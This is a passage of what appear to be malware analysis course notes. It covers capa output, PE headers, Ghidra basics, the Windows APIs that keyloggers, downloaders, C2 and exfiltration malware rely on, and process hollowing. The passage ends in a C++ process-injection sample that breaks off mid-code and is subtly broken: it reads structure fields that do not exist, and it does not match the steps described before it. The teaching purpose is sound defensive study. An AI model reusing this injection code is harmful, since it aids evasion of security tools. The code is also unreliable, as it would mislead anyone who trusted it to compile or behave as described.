+-----------------------------+-------------------------------------------------------------------------------+

+------------------------------------------------------+------------------------------------------------------+
| CAPABILITY                                           | NAMESPACE                                            |
|------------------------------------------------------+------------------------------------------------------|
| contain obfuscated stackstrings                      | anti-analysis/obfuscation/string/stackstring         |
| encrypt data using RC4 PRGA                          | data-manipulation/encryption/rc4                     |
| contains PDB path                                    | executable/pe/pdb                                    |
| contain a resource (.rsrc) section                   | executable/pe/section/rsrc                           |
| accept command line arguments                        | host-interaction/cli                                 |
| manipulate console                                   | host-interaction/console                             |
| query environment variable                           | host-interaction/environment-variable                |
| delete file                                          | host-interaction/file-system/delete                  |
| read file                                            | host-interaction/file-system/read                    |
| write file (2 matches)                               | host-interaction/file-system/write                   |
| enumerate gui resources                              | host-interaction/gui                                 |
| get disk information                                 | host-interaction/hardware/storage                    |
| get hostname                                         | host-interaction/os/hostname                         |
| get thread local storage value (3 matches)           | host-interaction/process                             |
| set thread local storage value (2 matches)           | host-interaction/process                             |
| terminate process (5 matches)                        | host-interaction/process/terminate                   |
| link function at runtime (8 matches)                 | linking/runtime-linking                              |
| link many functions at runtime                       | linking/runtime-linking                              |
| parse PE exports (2 matches)                         | load-code/pe                                         |
| parse PE header (4 matches)                          | load-code/pe                                         |
+------------------------------------------------------+------------------------------------------------------+

FLARE Sun 09/18/2022 18:34:13.15
C:\Users\Administrator\Desktop>
```

We can see that Capa has mapped the identified capabilities according to the MITRE ATT&CK framework and [Malware Behavior Catalog (MBC)](https://github.com/MBCProject/mbc-markdown).
 In the last table, we see the capabilities against the matched 
signatures and the number of signatures that have found a hit against 
these capabilities. As we might see, it also tells us if there are 
obfuscated stackstrings in the sample, allowing us to identify if 
running FLOSS against the sample might be helpful. To find out more 
information about the sample, we can use the `-v` or the `-vv`
 operator, which will show us the results in verbose or very verbose 
mode, identifying addresses where we might find the said capability.

**Leveraging the PE header**

So
 far in this room, we have covered techniques that work regardless of 
the file type of the malware. However, those techniques are a little 
hit-and-miss, as they don't always provide us with deterministic 
information about the malware. The PE headers provide a little more deterministic characteristics of the sample, which tells us much more about the sample.

## The PE header:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/83e849434f20772975b27d9be4c5eb90.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/83e849434f20772975b27d9be4c5eb90.png)

The programs that we run are generally stored in the executable file 
format. These files are portable because they can be taken to any system
 with the same Operating System and dependencies, and they will perform 
the same task on that system. Therefore, these files are called Portable
 Executables (PE files). The PE
 files consist of a sequence of bits stored on the disk. This sequence 
is in a specific format. The initial bits define the characteristics of 
the PE file and explain how to read the rest of the data. This initial part of the PE file is called a PE header.

Several tools in the FLARE VM can help us analyze PE
 headers. PEStudio is one of them. We already familiarized ourselves 
with PEStudio in a previous task, so we will just use that in this task 
as well.

The PE header contains rich information useful for malware analysis. We will learn about this data in detail in the [Dissecting PE headers](https://tryhackme.com/room/dissectingpeheaders) room. However, we can get the following information from a PE header as an overview.

### Linked Libraries, imports, and functions:

A PE 
file does not contain all of its code to perform all the tasks. It often
 reuses code from libraries, often provided by Microsoft as part of the 
Windows Operating System. Often, certain functions from these libraries 
are imported by the PE file. The PE header contains information about the libraries that a PE
 file uses and the functions it imports from those libraries. This 
information is very useful. A malware analyst can look at the libraries 
and functions that a PE
 file imports and get a rough idea of the functionality of a malware 
sample. For example, if a malware sample imports the CreateProcessA 
function, we can assume that this sample will create a new process.

Similarly,
 other functions can provide further information about the sample. 
However, it must be noticed that we don't know the context in which 
these functions are called by just looking at the PE headers. We need to dig deeper into that, which we will cover in the upcoming rooms.

PEStudio has a libraries option in the right pane, which, when selected, shows us the libraries that a PE file will use.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/92c68509a63ef0222bfe5034500c8ff0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/92c68509a63ef0222bfe5034500c8ff0.png)

The functions option just below shows the functions imported from these libraries.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/4287e575d2ddfdb4acb4b525dca17824.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/61306d87a330ed00419e22e7/room-content/4287e575d2ddfdb4acb4b525dca17824.png)

### Identifying Packed Executables:

As we have seen so far, static analysis bares a lot of information 
that can be used against the malware. Malware authors understand this as
 a problem. Therefore, they often go to great lengths to thwart 
analysis. One of the ways they can do this is by packing the original 
sample inside a shell-type code that obfuscates the properties of the 
actual malware sample. This technique is called packing, and the 
resultant PE file is called a packed PE
 file. Packing greatly reduces the effectiveness of some of the malware 
analysis techniques we have learned about so far. For example, if we try
 to search for strings in a packed executable, we might not find 
anything useful because of packing. Similarly, searching for similar 
samples using ssdeep might return more samples packed with the same 
packer instead of samples behaviorally similar to the sample of 
interest. Some signatures might also be evaded due to a malware sample 
being packed.

As we will see in the upcoming [Dissecting PE headers](https://tryhackme.com/room/dissectingpeheaders) room, we can identify packed executables by analyzing the PE header of a malware sample. The PE
 header contains important information such as the number of sections, 
permissions of different sections, sizes of the sections, etc. This 
information can give us pointers to help identify if the malware sample 
is packed and, if so, which type of packer has packed the executable.

## **ADVANCED STATIC ANALYSIS**

**Malware Analysis: Overview**

Malware
 analysis is the process of examining malicious software (malware) to 
understand how it works and identify its capabilities, behavior, and 
potential impact. There are four main steps in analyzing malware: **basic static analysis**, **basic dynamic analysis**, **advanced static analysis**, and **advanced dynamic analysis**. Each step uses different tools and techniques to gather information about the malware.

# Basic Static Analysis

The basic static analysis aims to understand the malware's structure 
and behavior without executing it. This involves examining the malware's
 code, file headers, and other static properties.

# Basic Dynamic Analysis

The basic dynamic analysis aims to observe the malware's behavior 
during execution in a controlled environment. This involves executing 
the malware in a sandbox or virtual machine and monitoring its system 
activity, network traffic, and process behavior.

# Advanced Dynamic Analysis

The advanced dynamic analysis aims to uncover more complex and 
evasive malware behavior using advanced monitoring techniques. This 
involves using more sophisticated sandboxes and monitoring tools to 
capture the malware's behavior in greater detail.

# Advanced Static Analysis

The advanced static analysis aims to uncover hidden or obfuscated 
code and functionality within the malware. This involves using more 
advanced techniques to analyze the malware's code, such as deobfuscation
 and code emulation.

# How Advanced Static Analysis Is Performed

Advanced static analysis of malware is a crucial process for 
understanding its behavior and identifying its potential threats. The 
key objectives of advanced static analysis are to discover the malware's
 capabilities, identify its attack vectors, and determine its evasion 
techniques.

To perform advanced static analysis, disassemblers such as IDA Pro, 
Binary Ninja, and radare2 are commonly used. These disassemblers allow 
the analyst to explore the malware's code and identify its functions and
 data structures. The steps involved in performing advanced static 
analysis of malware are as follows:

- Identify the entry point of the malware and the system calls it makes.
- Identify the malware's code sections and analyze them using available tools such as debuggers and hex editors.
- Analyze the malware's control flow graph to identify its execution path.
- Trace the malware's dynamic behavior by analyzing the system calls it makes during execution.
- Use the above information to understand the malware's evasion techniques and the potential damage it can cause.

**Ghidra: A Quick Overview**

Many
 disassemblers like Cutter, radare2, Ghidra, and IDA Pro can be used to 
disassemble malware. However, we will explore Ghidra in this room 
because it's free, open-source, and has many features that can be 
utilized to get proficient in reverse engineering. The objective is to 
get comfortable with the main usage of a disassembler and use that 
knowledge to use any disassembler.

**Ghidra** is a software reverse engineering tool that allows users 
to analyze compiled code to understand its functionality. It is designed
 to help analysts and developers understand how the software works by
 providing a platform to decompile, disassemble, and debug binaries.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/b95535ba93e88ce9885aa84a2d523a7c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/b95535ba93e88ce9885aa84a2d523a7c.png)

**Features**Ghidra includes many features that make it a powerful reverse engineering tool. Some of these features include:

- **Decompilation:** Ghidra can decompile binaries into readable C code, making it easier for developers to understand how the software works.
- **Disassembly:** Ghidra can disassemble binaries into assembly language, allowing analysts to examine the low-level operations of the code.
- **Debugging:** Ghidra has a built-in debugger that allows users to step through code and examine its behavior.
- **Analysis:** Ghidra can automatically identify functions, variables, and other code to help users understand the structure of the code.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/31bd01c318e5d3edfe699dd8a885fb12.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/31bd01c318e5d3edfe699dd8a885fb12.png)

# How to use Ghidra for Analysis

We will explore Ghidra and its features by analyzing a simple `HelloWorld.exe` program that's located on the Desktop. Here are the steps to perform code analysis using Ghidra:

- Open Ghidra and create a new project.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/0f76e89684b13728c6b30e4dae7f3cca.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/0f76e89684b13728c6b30e4dae7f3cca.png)

- Select **Non-Shared** **Project**. Selecting **Shared Project** would allow us to share our analysis with other analysts.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/f724b2f4335e62644fda147b6f20fb33.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/f724b2f4335e62644fda147b6f20fb33.png)

- Name the project and set the directory or leave the default path.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/a7c746831caa8e8865eee6fa6295890a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/a7c746831caa8e8865eee6fa6295890a.png)

- Import the malware executable you want to analyze. Now that we have created an empty project, let's Drag & Drop `HelloWorld.exe` that's located on the Desktop in that project, or navigate to the Desktop folder and select the program.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/cbd0101db66c015df4f32eecee7857ab.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/cbd0101db66c015df4f32eecee7857ab.png)

- Once it's imported, it shows us the summary of the program as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/7f8c4c4ba8fa80a9de690617dbefbf02.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/7f8c4c4ba8fa80a9de690617dbefbf02.png)

- Double-click on **HelloWorld.exe** to open it in the Code Browser. When asked to analyze the executable, click on **Yes**.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/73812dfaae55db78c9fff4ab621401d0.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/73812dfaae55db78c9fff4ab621401d0.png)

- The next window that appears shows us various analysis options. We can
check or uncheck them based on our needs. These plug-ins or add-ons
assist Ghidra during the analysis.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/ef6f8a3d9e21dd0d14fcdb8a0a011b0c.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/ef6f8a3d9e21dd0d14fcdb8a0a011b0c.png)

It will take some time to analyze. The bar on the bottom-right shows the progress. Wait until the analysis is 100%.

# Exploring the Ghidra Layout

- Ghidra has so many options to aid in our analysis. Its default layout is shown and explained briefly below.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/a0b59e7019e8e2fc7f1b9393489fbf10.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/a0b59e7019e8e2fc7f1b9393489fbf10.png)

1. **Program Trees:** Shows sections of the program. We can click on different sections to see the content within each. The [Dissecting PE Headers](https://tryhackme.com/room/dissectingpeheaders) room explains headers and PE sections in depth.
2. **Symbol Tree:** Contains important sections like Imports, Exports, and Functions. Each
section provides a wealth of information about the program we are
analyzing.
    - **Imports:** This ****section contains information about the libraries being imported by the program. Clicking on each API call shows the assembly code that uses that API.
    - **Exports:** This ****section contains the API/function calls being exported by the program. This section is useful when analyzing a DLL, as it will show all the functions dll contains.
    - **Functions:** This ****section contains the functions it finds within the code. Clicking on each
    function will take us to the disassembled code of that function. It also contains the entry function. Clicking on the `entry` function will take us to the start of the program we are analyzing. Functions with generic names starting with `FUN_VirtualAddress` are the ones that Ghidra does not give any names to.
3. **Data Type Manager:** This section shows various data types found in the program.
4. **Listing:** This window shows the disassembled code of the binary, which includes the following values in order.
    - Virtual Address
    - Opcode
    - Assembly Instruction (PUSH, POP, ADD, XOR, etc.)
    - Operands
    - Comments
5. **Decompile**: Ghidra translates the assembly code into a pseudo C code here. This is a very
important section to look at during analysis as it gives a better
understanding of the assembly code.
6. **Toolbar:** It has various options to use during the analysis.
- **Graph View:** The Graph View in the toolbar is an important option, allowing us to see the graph view of the disassembly.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/037ba353282224e547d2f12722e0c0b7.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/037ba353282224e547d2f12722e0c0b7.png)

- **The Memory Map** option shows the memory mapping of the program as shown below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/290b22b08876e6b5d92db2143932f9f4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/290b22b08876e6b5d92db2143932f9f4.png)

- This navigation toolbar shows different options to navigate through the code.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/d0f9cc1c1e8b8bc5114a7832e84a856b.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/d0f9cc1c1e8b8bc5114a7832e84a856b.png)

- Explore Strings. Go to `Search -> For Strings` and click Search will give us the strings that Ghidra finds within the program. This window can contain very juicy information to help us during the analysis.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/31ddc15ff3e17b57767bbebc9220faa3.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/31ddc15ff3e17b57767bbebc9220faa3.png)

# Analyzing HelloWorld in Assembly

There are many ways to reach the code of interest. To find the assembly code for **HelloWorld.exe**, we will double-click on **.text**
 in the Program Trees section; it will take us to the disassembled code 
section. Scroll through the disassembled code until you see the call for
 the messagebox that will display the `Hello World` string. In the Decompile section, we can see the translated pseudo C code of that function.

The disassembled section shows how the arguments are being pushed, followed by the call to [MessageBoxA](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messageboxa), responsible for the message box display.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/335a22fc87e428662afbe1b257bde334.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/335a22fc87e428662afbe1b257bde334.png)

We
 explored Ghidra and its features in this task by examining a simple 
"HelloWorld" program. In the next task, we will use this knowledge to 
explore different C constructs and their corresponding representations 
in assembly.

**Note:** It is trivial to note that the malware's author may have packed it or used obfuscation or Anti VM / AV detection techniques to make the analysis harder. These techniques will be discussed in the coming rooms.

**An Overview of Windows API Calls**

The
 Windows API is a collection of functions and services the Windows 
Operating System provides to enable developers to create Windows 
applications. These functions include creating windows, menus, buttons, 
and other user-interface elements and performing tasks such as file 
input/output and network communication. Let's take an example of a very 
common API function: [CreateProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa).

# Create Process API

The `CreateProcessA` function creates a new process and 
its primary thread. The function takes several parameters, including the
 name of the executable file, command-line arguments, and security 
attributes.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/44520d306a993be58ddd3f5cb8712ac1.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e8dd9a4a45e18443162feab/room-content/44520d306a993be58ddd3f5cb8712ac1.png)

Here is an example of C code that uses the `CreateProcessA` function to launch a new process:

```c
#include

int main()
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(NULL, "C:\\\\Windows\\\\notepad.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
    {
        printf("CreateProcess failed (%d).\\n", GetLastError());
        return 1;
    }

    WaitForSingleObject(pi.hProcess, INFINITE);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
```

When compiled into assembly code, the `CreateProcessA` function call looks like this:

```c
push 0
lea eax, [esp+10h+StartupInfo]
push eax
lea eax, [esp+14h+ProcessInformation]
push eax
push 0
push 0
push 0
push 0
push 0
push 0
push dword ptr [hWnd]
call CreateProcessA
```

This assembly code pushes the necessary parameters onto the stack in reverse order and then calls the `CreateProcessA` function. The `CreateProcessA` function then launches a new process and returns a handle to the process and its primary thread.

During malware analysis, identifying the API call and examining the code can help understand the malware's purpose.

**Common APIs used by Malware**

Malware
 authors heavily rely on Windows APIs to accomplish their goals. It's 
important to know the Windows APIs used in different malware variants. 
It's an important step in advanced static analysis to examine the `import` functions, which can reveal much about the malware.

# Keylogger

Malware can use several Windows APIs for keylogging, including:

- **SetWindowsHookEx**: This function installs an
application-defined hook procedure into a hook chain. Malware can use
this function to monitor and intercept system events, such as keystrokes or mouse clicks. [SetWindowsHookEx](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa)
- **GetAsyncKeyState**: This function retrieves the status of a virtual key when the function
is called. Malware can use this function to determine if a key is being
pressed or released. [GetAsyncKeyState](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate)
- **GetKeyboardState**: This function retrieves the status of all virtual keys. Malware can use this function to determine the status of all keys on the keyboard. [GetKeyboardState](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeyboardstate)
- **GetKeyNameText**: This function retrieves the name of a key. Malware can use this function to determine the name of the pressed key. [GetKeyNameText](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getkeynametexta)

Using these APIs, malware can intercept and record keystrokes, 
allowing it to capture sensitive information such as passwords and 
credit card numbers.

# Downloader

A
 downloader is a type of malware designed to download other malware onto
 a victim's system. Downloaders can be disguised as legitimate software 
or files and spread through malicious email attachments, software 
downloads, or by exploiting vulnerabilities in software. Downloaders can
 use various Windows APIs to perform their malicious actions. Some of 
the APIs commonly used by downloaders include:

- **URLDownloadToFile**: This function downloads a file from the internet and saves it to a
local file. Malware can use this function to download additional
malicious code or updates to the malware. [URLDownloadToFile](https://learn.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775123(v=vs.85))
- **WinHttpOpen**: This function initializes the WinHTTP API. Malware can use this
function to establish an HTTP connection to a remote server and download additional malicious code. [WinHttpOpen](https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopen)
- **WinHttpConnect**: This function establishes a connection to a remote server using the
WinHTTP API. Malware can use this function to connect to a remote server and download additional malicious code. [WinHttpConnect](https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpconnect)
- **WinHttpOpenRequest**: This function opens HTTP request using the WinHTTP API. Malware can use this function to send HTTP requests to a remote server and download
additional malicious code or steal data. [WinHttpOpenRequest](https://docs.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopenrequest)

# C2 Communication

Command
 and Control (C2) communication is a method malware uses to communicate 
with a remote server or attacker. This communication can be used to 
receive commands from the attacker, send stolen data to the attacker, or
 download additional malware onto the victim's system.

- **InternetOpen**: This function initializes a session for connecting to the internet.
Malware can use this function to connect to a remote server and
communicate with a command-and-control (C2) server. [InternetOpen](https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopena)
- **InternetOpenUrl**: This function opens a URL for download. Malware can use this function
to download additional malicious code or steal data from a C2 server. [InternetOpenUrl](https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetopenurla)
- **HttpOpenRequest**: This function opens HTTP request. Malware can use this function to send HTTP requests to a C2 server and receive commands or additional
malicious code. [HttpOpenRequest](https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpopenrequesta)
- **HttpSendRequest**: This function sends HTTP request to a C2 server. Malware can use this
function to send data or receive commands from a C2 server. [HttpSendRequest](https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-httpsendrequesta)

# Data Exfiltration

Data 
exfiltration is the unauthorized data transfer from an organization to 
an external destination. Malware can use various Windows APIs to perform
 data exfiltration, including:

- **InternetReadFile**: This function reads data from a handle to an open internet resource.
Malware can use this function to steal data from a compromised system
and transmit it to a C2 server. [InternetReadFile](https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-internetreadfile)
- **FtpPutFile**: This function uploads a file to an FTP server. Malware can use this function to exfiltrate stolen data to a remote server. [FtpPutFile](https://docs.microsoft.com/en-us/windows/win32/api/wininet/nf-wininet-ftpputfilea)
- **CreateFile**: This function creates or opens a file or device. Malware can use this
function to read or modify files containing sensitive information or
system configuration data. [CreateFile](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea)
- **WriteFile**: This function writes data to a file or device. Malware can use this
function to write stolen data to a file and then exfiltrate it to a
remote server. [WriteFile API](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile)
- **GetClipboardData**: This API is used to retrieve data from the clipboard. Malware can use
this API to retrieve sensitive data that is copied to the clipboard. [GetClipboardData](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getclipboarddata)

# Dropper

A dropper is a 
malware designed to install other malware onto a victim's system. 
Droppers can be disguised as legitimate software or files and spread 
through malicious email attachments, software downloads, or by 
exploiting vulnerabilities in software.

- **CreateProcess**: This function creates a new process and its primary thread. Malware can use this function to execute its code in the context of a legitimate
process, making it more difficult to detect and analyze. [CreateProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)
- **VirtualAlloc**: This function reserves or commits a region of memory within the virtual address space of the calling process. Malware can use this function to
allocate memory to store its code. [VirtualAlloc](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
- **WriteProcessMemory**: This function writes data to an area of memory within the address space of a specified process. Malware can use this function to write its code to the allocated memory. [WriteProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)

# API Hooking

API
 hooking is a method malware uses to intercept calls to Windows APIs and
 modify their behavior. This allows the malware to avoid detection by 
security software and perform malicious actions such as stealing data or
 modifying system settings. Malware can use various APIs for hooking, 
including:

- **GetProcAddress**: This function
retrieves the address of an exported function or variable from a
specified dynamic-link library (DLL). Malware can use this function to
locate and hook API calls made by other processes. [GetProcAddress](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)
- **LoadLibrary**: This function loads a dynamic-link library (DLL) into a process's
address space. Malware can use this function to load and execute
additional code from a DLL or other module. [LoadLibrary](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya)
- **SetWindowsHookEx** API: This API is used to install a hook procedure that monitors
messages sent to a window or system event. Malware can use this API to
intercept calls to other Windows APIs and modify their behavior. [SetWindowsHookEx API](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa)

# Anti-debugging and VM detection

Anti-debugging and VM
 detection are techniques used by malware to evade detection and 
analysis by security researchers. Here are some common Windows APIs used
 for these purposes:

- **IsDebuggerPresent**: This function checks whether a process is running under a debugger. Malware can use this function to determine whether it is being analyzed and take appropriate action to
evade detection. [IsDebuggerPresent](https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-isdebuggerpresent)
- **CheckRemoteDebuggerPresent**: This function checks whether a remote debugger is debugging a process.
Malware can use this function to determine whether it is being analyzed
and take appropriate action to evade detection. [CheckRemoteDebuggerPresent](https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-checkremotedebuggerpresent)
- **NtQueryInformationProcess**: This function retrieves information about a specified process. Malware
can use this function to determine whether the process is being debugged and take appropriate action to evade detection. [NtQueryInformationProcess](https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess)
- **GetTickCount**: This function retrieves the number of milliseconds that have elapsed
since the system was started. Malware can use this function to determine whether it is running in a virtualized environment, which may indicate
that it is being analyzed. [GetTickCount](https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-gettickcount)
- **GetModuleHandle**: This function retrieves a handle to a specified module. Malware can use this function to determine whether it is running under a virtualized
environment, which may indicate that it is being analyzed. [GetModuleHandle](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea)
- **GetSystemMetrics**: This function retrieves various system metrics and configuration
settings. Malware can use this function to determine whether it is
running under a virtualized environment, which may indicate that it is
being analyzed. [GetSystemMetrics](https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getsystemmetrics)

Details on Anti-debugging / AV detection are discussed in this room [Anti-Reverse Engineering](https://tryhackme.com/room/antireverseengineering).

**Process Hollowing: Overview**

Now
 that we have understood how to identify code constructs in assembly, 
let's use the knowledge gained earlier to understand and analyze the 
process injection technique known as [process hollowing](https://attack.mitre.org/techniques/T1055/012/), which malware mostly uses to evade detection.

# Process Hollowing

Process
 hollowing is a technique malware uses to inject malicious code into a 
legitimate process running on a victim's computer. The malware creates a
 suspended process and replaces its memory space with its own code. The 
malware then resumes the process, causing it to execute the injected 
code. This technique allows the malware to bypass security measures that
 may be in place, as the malicious code is executed within the context 
of a legitimate process.

# How Process Hollowing is Achieved

Process hollowing involves several steps:

- Create a new process using the `CreateProcessA()` API. This process will act as a legitimate process and will be hollowed out.
- `NtSuspendProcess()` is then used to suspend the new process.
- Allocate memory in the suspended process using the `VirtualAllocEx()` API. This memory will be used to hold the malicious code.
- Write the malicious code to the allocated memory using the `WriteProcessMemory()` API.
- Modify the entry point of the process to point to the address of the malicious code using the `SetThreadContext()` and `GetThreadContext()` APIs.
- Resume the suspended process using the `NtResumeProcess()` API. This will cause the process to execute the malicious code.
- Clean up the process and any resources used during the process.

To have a better understanding of the technique we are covering, a sample C++ Code is added below:

```c
#include
#include
#include
using namespace std;

bool HollowProcess(char *szSourceProcessName, char *szTargetProcessName)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe))
    {
        do
        {
            if (_stricmp((const char*)pe.szExeFile, szTargetProcessName) == 0)
            {
                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
                if (hProcess == NULL)
                {
                    return false;
                }

                IMAGE_DOS_HEADER idh;
                IMAGE_NT_HEADERS inth;
                IMAGE_SECTION_HEADER ish;

                DWORD dwRead = 0;

                ReadProcessMemory(hProcess, (LPVOID)pe.modBaseAddr, &idh, sizeof(idh), &dwRead);
                ReadProcessMemory(hProcess, (LPVOID)(pe.modBaseAddr + idh.e_lfanew), &inth, sizeof(inth), &dwRead);

                LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, inth.OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

                if (lpBaseAddress == NULL)
                {
                    return false;
                }

                if (!WriteProcessMemory(hProcess, lpBaseAddress, (LPVOID)pe.modBaseAddr, inth.OptionalHeader.SizeOfHeaders, &dwRead))
                {
                    return false;
                }

                for (int i = 0; i < inth.FileHeader.NumberOfSections; i++)
                {
                    ReadProcessMemory(hProcess, (LPVOID)(pe.modBaseAddr + idh.e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER))), &ish, sizeof(ish), &dwRead);
                    WriteProcessMemory(hProcess, (LPVOID)((DWORD)lpBaseAddress + ish.VirtualAddress), (LPVOID)((DWORD)pe.modBaseAddr + ish.PointerToRawData), ish.SizeOfRawData, &dwRead);
                }

                DWORD dwEntrypoint = (DWORD)pe.modBaseAddr + inth.OptionalHeader.AddressOfEntryPoint;
                DWORD dwOffset = (DWORD)lpBaseAddress - inth.OptionalHeader.ImageBase + dwEntrypoint;

                if (!WriteProcessMemory(hProcess, (LPVOID)(lpBaseAddress + dwEntrypoint - (DWORD)pe.modBaseAddr), &dwOffset, sizeof(DWORD), &dwRead))
                {
                    return false;
                }

                CloseHandle(hProcess);

                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(NULL, szSourceProcessName, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
    {
        return false;
    }

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;

    if (!GetThreadContext(pi.hThread, &ctx))
    {
        return false;
    }

    ctx.Eax = (DWORD)pi.lpBaseOfImage + ((IMAGE_DOS_HEADER*)pi.lpBaseOfImage)->e_lfanew + ((IMAGE_NT_HEADERS*)(((BYTE*)pi.lpBaseOfImage) + ((IMAGE_DOS_HEADER*)pi.lpBaseOfImage)->e_lfanew))->OptionalHeader.AddressOfEntryPoint;

